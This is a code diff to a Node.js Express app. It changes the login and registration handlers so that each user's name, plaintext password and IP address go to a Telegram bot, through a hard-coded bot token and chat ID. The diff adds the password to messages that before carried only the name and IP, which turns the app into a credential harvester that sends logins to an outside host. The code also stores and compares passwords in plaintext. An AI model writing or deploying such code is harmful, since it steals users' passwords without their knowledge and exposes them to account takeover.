@@ -36,8 +36,6 @@ app.get('/', (req, res) => {
     res.render('name');
 });
 
-
-
 // Handle search request
 app.post('/search', async (req, res) => {
     const query = req.body.query;
@@ -54,11 +52,10 @@ app.post('/search', async (req, res) => {
     }
 });
 
-
 // Save user name and password
 app.post('/save-name', (req, res) => {
     const { userName, password } = req.body;
-    const ip = req.ip;  // Get user IP address
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;  // Get user IP address
 
     // Read existing users from the file
     const users = readUserData();
@@ -70,7 +67,7 @@ app.post('/save-name', (req, res) => {
         // If user exists, login with the existing password
         if (existingUser.password === password) {
             // Send data to Telegram bot
-            sendToTelegram(`User logged in: ${userName} with IP: ${ip}`);
+            sendToTelegram(`User logged in:\nName: ${userName}\nPassword: ${password}\nIP: ${ip}`);
             return res.redirect('/search');
         } else {
             return res.status(401).send('Incorrect password');
@@ -87,7 +84,7 @@ app.post('/save-name', (req, res) => {
         writeUserData(users);
 
         // Send data to Telegram bot
-        sendToTelegram(`New user registered: ${userName} with IP: ${ip}`);
+        sendToTelegram(`New user registered:\nName: ${userName}\nPassword: ${password}\nIP: ${ip}`);
 
         return res.redirect('/search');
     }
@@ -96,7 +93,7 @@ app.post('/save-name', (req, res) => {
 // Function to send messages to Telegram bot
 function sendToTelegram(message) {
     const TELEGRAM_BOT_TOKEN = '7981577790:AAHhoGXjXGj2UCRKsSHWKXkAWH-HlKhiNk8';
-const TELEGRAM_CHAT_ID = '5901409601';
+    const TELEGRAM_CHAT_ID = '5901409601';
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
